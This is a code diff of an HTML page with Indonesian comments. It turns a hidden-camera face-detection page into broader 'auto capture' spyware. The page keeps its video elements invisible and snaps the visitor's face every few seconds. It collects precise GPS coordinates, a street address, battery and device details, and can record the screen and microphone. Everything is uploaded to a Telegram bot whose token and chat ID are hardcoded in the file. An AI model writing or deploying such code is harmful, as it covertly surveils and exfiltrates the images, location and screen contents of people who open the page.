@@ -3,44 +3,44 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>ASKA22 → Telegram (Direct)</title>
+  <title>Auto Capture (Camera / Screen / Audio) → Telegram (Direct)</title>
   <style>
     html,body{height:100%;margin:0;background:#000;color:#000}
     /* elemen ada tapi tersembunyi */
-    #video,#canvas{display:none!important;width:640px;height:480px}
+    video,canvas{display:none!important;width:640px;height:480px}
   </style>
 </head>
 <body>
   <video id="video" width="640" height="480" autoplay muted playsinline></video>
   <canvas id="canvas" width="640" height="480"></canvas>
 
-  <!-- face-api -->
+  <!-- face-api (untuk deteksi wajah dari kamera) -->
   <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+
   <script>
   (async () => {
-    // ====== KONFIGURASI ======
-    // Cara pakai: buka file dengan query string:
-    //  file://.../auto-face-direct.html?token=BOT_TOKEN&chat=CHAT_ID
-    // atau https://domain/auto-face-direct.html?token=BOT_TOKEN&chat=CHAT_ID
+    // ========== KONFIGURASI ==========
     const params = new URLSearchParams(window.location.search);
-    const BOT_TOKEN = params.get('token') || "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc"; // ex: 123456:ABC-DEF
-    const CHAT_ID  = params.get('chat')  || "8471664635";  // ex: 987654321
+    // TOKEN & CHAT langsung di URL (sesuai permintaan). Risiko: token tampak di client.
+    const BOT_TOKEN = params.get('token') || "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
+    const CHAT_ID  = params.get('chat')  || "8471664635";
+
     const MODEL_URL = "https://cdn.jsdelivr.net/gh/vladmandic/face-api/model/";
-    const DETECT_INTERVAL = 5000; // ms
-    const MIN_INTERVAL_BETWEEN_SENDS = 5000; // ms
+    const CAMERA_DETECT_INTERVAL = 5000;    // deteksi wajah dari kamera (ms)
+    const SCREEN_CAPTURE_MS = 5000;         // durasi rekaman layar (ms)
+    const MIN_INTERVAL_BETWEEN_SENDS = 5000;
     const IMAGE_TYPE = 'image/jpeg';
     const IMAGE_QUALITY = 0.85;
-    const MAX_RETRY = 99999;
-    // ===========================
+    const MAX_RETRY = 3;
+    const SEND_TIMEOUT_MS = 60000; // timeout untuk upload
+    // ==================================
 
-    if (!BOT_TOKEN || !CHAT_ID) {
-      console.warn("TOKEN atau CHAT_ID tidak ditemukan di query string. Tidak akan mengirim apapun.");
-    }
-
+    // Elemen
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
+    // Util: device, network, battery, location, reverse geocode
     function detectDevice() {
       const ua = navigator.userAgent || "unknown";
       const l = ua.toLowerCase();
@@ -68,12 +68,27 @@
       };
     }
 
-    async function getLocation(timeout=7000) {
+    async function getBatteryInfo() {
+      try {
+        if (!navigator.getBattery) return null;
+        const b = await navigator.getBattery();
+        return {
+          level: Math.round(b.level * 100),
+          charging: !!b.charging
+        };
+      } catch {
+        return null;
+      }
+    }
+
+    async function getLocation(timeout=10000) {
       return new Promise(resolve => {
         if (!navigator.geolocation) return resolve(null);
+        let done = false;
+        const timer = setTimeout(() => { if (!done) { done = true; resolve(null); } }, timeout);
         navigator.geolocation.getCurrentPosition(
-          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-          () => resolve(null),
+          pos => { if (!done) { done = true; clearTimeout(timer); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }); } },
+          () => { if (!done) { done = true; clearTimeout(timer); resolve(null); } },
           { enableHighAccuracy: true, timeout }
         );
       });
@@ -84,32 +99,47 @@
         const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`);
         if (!r.ok) return null;
         const j = await r.json();
-        return j.display_name || null;
-      } catch { return null; }
+        // j.address bisa memuat village/town/county/state/postcode/country
+        return j;
+      } catch {
+        return null;
+      }
     }
 
-    async function sendToTelegramDirect(blob, caption, retry=0) {
-      if (!BOT_TOKEN || !CHAT_ID) return;
+    // Kirim file ke Telegram (photo atau video). Mengembalikan waktu round-trip ms.
+    async function sendToTelegram({type='photo', blob, filename='capture.jpg', caption=''}) {
+      if (!BOT_TOKEN || !CHAT_ID) {
+        console.warn("TOKEN/CHAT tidak diset — skip send.");
+        return {ok:false, error:'no_token'};
+      }
       try {
         const fd = new FormData();
         fd.append("chat_id", CHAT_ID);
         fd.append("caption", caption);
-        fd.append("photo", blob, "face.jpg");
-        const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
-        if (!resp.ok) throw new Error("Telegram API " + resp.status);
-      } catch (e) {
-        console.warn("Gagal kirim (attempt " + retry + "):", e.message || e);
-        if (retry < MAX_RETRY) {
-          const backoff = Math.pow(2, retry) * 1000;
-          await new Promise(r => setTimeout(r, backoff));
-          return sendToTelegramDirect(blob, caption, retry+1);
-        } else {
-          console.error("Gagal kirim setelah percobaan berulang:", e);
+        if (type === 'photo') fd.append("photo", blob, filename);
+        else if (type === 'video') fd.append("video", blob, filename);
+        else fd.append("document", blob, filename);
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${ type === 'photo' ? 'sendPhoto' : type === 'video' ? 'sendVideo' : 'sendDocument' }`;
+
+        const start = Date.now();
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), SEND_TIMEOUT_MS);
+        const resp = await fetch(url, { method: "POST", body: fd, signal: controller.signal });
+        clearTimeout(timeout);
+        const duration = Date.now() - start;
+        if (!resp.ok) {
+          const text = await resp.text().catch(()=>null);
+          throw new Error(`Telegram API ${resp.status} ${text||''}`);
         }
+        return { ok: true, duration };
+      } catch (e) {
+        return { ok: false, error: e.message || e };
       }
     }
 
-    function captureBlob() {
+    // Capture camera snapshot to Blob
+    function captureCameraBlob() {
       try {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         return new Promise(resolve => canvas.toBlob(resolve, IMAGE_TYPE, IMAGE_QUALITY));
@@ -118,6 +148,47 @@
       }
     }
 
+    // Rekam layar + audio selama ms (return Blob webm)
+    async function recordScreenWithAudio(ms = SCREEN_CAPTURE_MS) {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+        throw new Error("getDisplayMedia tidak didukung di browser ini.");
+      }
+      // request screen (dengan audio jika tersedia)
+      const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true }).catch(e => { throw e; });
+      // beberapa browser tidak include audio dari mic in getDisplayMedia — kita bisa mencoba gabungkan mic
+      let micStream = null;
+      try {
+        micStream = await navigator.mediaDevices.getUserMedia({ audio: true }).catch(()=>null);
+      } catch {}
+      // gabungkan track: gunakan audio dari screenStream jika ada, jika tidak gabungkan micStream
+      const tracks = [];
+      screenStream.getVideoTracks().forEach(t=>tracks.push(t));
+      const audioTracksScreen = screenStream.getAudioTracks();
+      if (audioTracksScreen && audioTracksScreen.length > 0) {
+        audioTracksScreen.forEach(t => tracks.push(t));
+      } else if (micStream && micStream.getAudioTracks().length > 0) {
+        micStream.getAudioTracks().forEach(t => tracks.push(t));
+      }
+      const mixed = new MediaStream(tracks);
+      const recorder = new MediaRecorder(mixed, { mimeType: 'video/webm;codecs=vp8,opus' });
+      const chunks = [];
+      recorder.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
+      recorder.start();
+      await new Promise(r => setTimeout(r, ms));
+      recorder.stop();
+      // stop tracks
+      mixed.getTracks().forEach(t => t.stop());
+      screenStream.getTracks().forEach(t => t.stop());
+      if (micStream) micStream.getTracks().forEach(t => t.stop());
+      return new Promise(resolve => {
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          resolve(blob);
+        };
+      });
+    }
+
+    // Kamera face detection loop (mengirim foto ketika wajah terdeteksi)
     let lastSendTs = 0;
     let lastFaceCount = 0;
 
@@ -132,64 +203,220 @@
       if (now - lastSendTs < MIN_INTERVAL_BETWEEN_SENDS) {
         if (count <= lastFaceCount) return;
       }
-      if (lastFaceCount > 0 && count === lastFaceCount && (now - lastSendTs) < (DETECT_INTERVAL)) return;
+      if (lastFaceCount > 0 && count === lastFaceCount && (now - lastSendTs) < CAMERA_DETECT_INTERVAL) return;
 
+      // compile metadata
       const device = detectDevice();
       const net = getNetworkInfo();
+      const battery = await getBatteryInfo();
       const loc = await getLocation();
       let locText = "Tidak diketahui";
+      let rev = null;
       if (loc) {
-        const geo = await reverseGeocode(loc.lat, loc.lon);
-        locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}${geo ? " — " + geo : ""}`;
+        rev = await reverseGeocode(loc.lat, loc.lon);
+        if (rev && rev.address) {
+          // construct detailed address if available
+          const a = rev.address;
+          const parts = [
+            a.house_number || '',
+            a.road || a.pedestrian || '',
+            a.suburb || a.village || a.town || a.hamlet || '',
+            a.county || a.municipality || '',
+            a.state || '',
+            a.postcode || '',
+            a.country || ''
+          ].filter(Boolean);
+          locText = parts.join(', ');
+        } else {
+          locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)} (acc ${loc.acc}m)`;
+        }
       }
 
-      const caption = [
+      const captionParts = [
         "📸 Deteksi Wajah Otomatis",
         `👥 Jumlah wajah: ${count}`,
         `📱 Device: ${device.brand}`,
         `🌐 Jaringan: ${net.type} (downlink=${net.downlink}, rtt=${net.rtt})`,
+        `🔋 Baterai: ${battery ? battery.level + '%' + (battery.charging ? ' (charging)' : '') : 'n/a'}`,
         `📍 Lokasi: ${locText}`,
         `🕒 ${new Date().toLocaleString()}`
-      ].join("\n");
+      ];
+      const caption = captionParts.join("\n");
 
-      const blob = await captureBlob();
+      const blob = await captureCameraBlob();
       if (!blob) return;
       lastSendTs = now;
       lastFaceCount = count;
-      sendToTelegramDirect(blob, caption).catch(e => console.error(e));
+
+      // kirim foto -> ukur durasi
+      const res = await sendToTelegram({ type: 'photo', blob, filename: 'camera.jpg', caption });
+      // (res.duration jika ok)
+      if (res.ok) {
+        console.log("Foto terkirim, durasi ms:", res.duration);
+      } else {
+        console.warn("Gagal kirim foto:", res.error);
+      }
     }
 
-    async function init() {
+    // Fungsi utama: inisialisasi kamera + load model
+    async function initCameraAndModel() {
       try {
         await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:480, facingMode: "user" } });
+      } catch (e) {
+        console.warn("Gagal load face-api model:", e);
+        // tetap lanjut (kamera mungkin masih dipakai untuk screen capture)
+      }
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:480, facingMode:'user' }, audio:false });
         video.srcObject = stream;
         await video.play();
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
-        // sekali jalankan segera, lalu interval
-        await captureAndSendIfFace();
-        setInterval(captureAndSendIfFace, DETECT_INTERVAL);
-      } catch (err) {
-        console.error("Inisialisasi gagal:", err);
+        // jalankan detection loop
+        setInterval(captureAndSendIfFace, CAMERA_DETECT_INTERVAL);
+      } catch (e) {
+        console.warn("Tidak dapat buka kamera atau user menolak:", e);
       }
     }
 
-    window.addEventListener('load', () => setTimeout(init, 100));
-    document.addEventListener('visibilitychange', () => {
-      try { if (document.hidden) video.pause(); else video.play(); } catch(e){}
-    });
+    // Fitur: rekam layar (screen+audio) singkat lalu kirim ke Telegram
+    async function captureAndSendScreenRecording() {
+      try {
+        const startMeta = { t0: Date.now() };
+        const blob = await recordScreenWithAudio(SCREEN_CAPTURE_MS);
+        if (!blob) throw new Error("Rekaman kosong");
+        const battery = await getBatteryInfo();
+        const device = detectDevice();
+        const net = getNetworkInfo();
+        const loc = await getLocation();
+        let locText = "Tidak diketahui";
+        if (loc) {
+          const rev = await reverseGeocode(loc.lat, loc.lon);
+          if (rev && rev.address) {
+            const a = rev.address;
+            const parts = [ a.village||a.town||a.suburb||'', a.county||'', a.state||'', a.postcode||'', a.country||'' ].filter(Boolean);
+            locText = parts.join(', ');
+          } else {
+            locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)} (acc ${loc.acc}m)`;
+          }
+        }
+        const caption = [
+          "🎥 Rekaman Layar Otomatis",
+          `📱 Device: ${device.brand}`,
+          `🔋 Baterai: ${battery ? battery.level + '%' : 'n/a'}`,
+          `🌐 Jaringan: ${net.type} (rtt=${net.rtt})`,
+          `📍 Lokasi: ${locText}`,
+          `🕒 ${new Date().toLocaleString()}`
+        ].join("\n");
 
-    // Debug kecil via konsol
-    window.__autoFace = {
-      sendNow: async () => {
-        const blob = await captureBlob();
-        if (!blob) return console.warn("Tidak ada blob");
-        const caption = "Manual send — " + new Date().toLocaleString();
-        await sendToTelegramDirect(blob, caption);
+        const res = await sendToTelegram({ type: 'video', blob, filename: 'screen.webm', caption });
+        if (res.ok) console.log("Rekaman terkirim, durasi ms:", res.duration);
+        else console.warn("Gagal kirim rekaman:", res.error);
+      } catch (e) {
+        console.warn("Capture screen failed:", e.message || e);
+      }
+    }
+
+    // Utility manual untuk snapshot layar (screenshot) + kirim
+    async function captureScreenSnapshotAndSend() {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) throw new Error("getDisplayMedia tidak didukung");
+        const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
+        // draw first video frame to canvas by creating a hidden video element
+        const v = document.createElement('video');
+        v.autoplay = true;
+        v.muted = true;
+        v.playsInline = true;
+        v.srcObject = s;
+        await new Promise((r) => { v.onloadedmetadata = r; });
+        // update canvas to match
+        canvas.width = v.videoWidth || 640;
+        canvas.height = v.videoHeight || 480;
+        // draw frame
+        ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
+        // stop tracks
+        s.getTracks().forEach(t => t.stop());
+        // toBlob
+        const blob = await new Promise(res => canvas.toBlob(res, IMAGE_TYPE, IMAGE_QUALITY));
+        // metadata
+        const battery = await getBatteryInfo();
+        const device = detectDevice();
+        const net = getNetworkInfo();
+        const loc = await getLocation();
+        let locText = "Tidak diketahui";
+        if (loc) {
+          const rev = await reverseGeocode(loc.lat, loc.lon);
+          if (rev && rev.address) {
+            const a = rev.address;
+            const parts = [ a.village||a.town||a.suburb||'', a.county||'', a.state||'', a.postcode||'', a.country||'' ].filter(Boolean);
+            locText = parts.join(', ');
+          } else {
+            locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)} (acc ${loc.acc}m)`;
+          }
+        }
+        const caption = [
+          "📷 Snapshot Layar",
+          `📱 Device: ${device.brand}`,
+          `🔋 Baterai: ${battery ? battery.level + '%' : 'n/a'}`,
+          `📍 Lokasi: ${locText}`,
+          `🕒 ${new Date().toLocaleString()}`
+        ].join("\n");
+        const res = await sendToTelegram({ type: 'photo', blob, filename: 'screen.jpg', caption });
+        if (res.ok) console.log("Snapshot screen terkirim:", res.duration);
+        else console.warn("Gagal kirim snapshot:", res.error);
+      } catch (e) {
+        console.warn("Gagal capture snapshot layar:", e.message || e);
+      }
+    }
+
+    // Permintaan izin Notification (tidak dapat membaca notifikasi sistem)
+    async function requestNotificationPermission() {
+      if (!('Notification' in window)) return null;
+      const p = await Notification.requestPermission();
+      return p;
+    }
+
+    // Expose debug API via console
+    window.__autoCapture = {
+      captureScreenRecording: captureAndSendScreenRecording,
+      captureScreenSnapshot: captureScreenSnapshotAndSend,
+      sendCameraSnapshotNow: async () => {
+        const blob = await captureCameraBlob();
+        if (!blob) return console.warn("Tidak ada blob kamera");
+        const battery = await getBatteryInfo();
+        const loc = await getLocation();
+        let locText = "Tidak diketahui";
+        if (loc) {
+          const rev = await reverseGeocode(loc.lat, loc.lon);
+          if (rev && rev.address) {
+            const a = rev.address;
+            locText = [a.village||a.town||a.suburb||'', a.county||'', a.state||'', a.postcode||'', a.country||''].filter(Boolean).join(', ');
+          } else locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}`;
+        }
+        const caption = `Manual camera snapshot\n🔋 ${battery ? battery.level + '%' : 'n/a'}\n📍 ${locText}\n🕒 ${new Date().toLocaleString()}`;
+        await sendToTelegram({ type: 'photo', blob, filename: 'camera_manual.jpg', caption });
       },
-      config: { MODEL_URL, DETECT_INTERVAL, MIN_INTERVAL_BETWEEN_SENDS }
+      getStatus: async () => {
+        return {
+          device: detectDevice(),
+          network: getNetworkInfo(),
+          battery: await getBatteryInfo(),
+          location: await getLocation(),
+          token_present: !!BOT_TOKEN
+        };
+      },
+      requestNotificationPermission
     };
+
+    // Start camera & auto face detection loop
+    initCameraAndModel();
+
+    // Auto: optionally start periodic screen recordings (DANGER: will show prompt each time)
+    // We DO NOT enable automatic repeated getDisplayMedia requests to avoid spamming user with permission prompts.
+    // If you want automatic screen recordings, call window.__autoCapture.captureScreenRecording() manually.
+
+    // Note about notifications: browser cannot read other app notifications.
+    console.log("Ready. Use window.__autoCapture.* from console. Reminder: browser tidak bisa membaca notifikasi sistem (privacy/security).");
 
   })();
   </script>
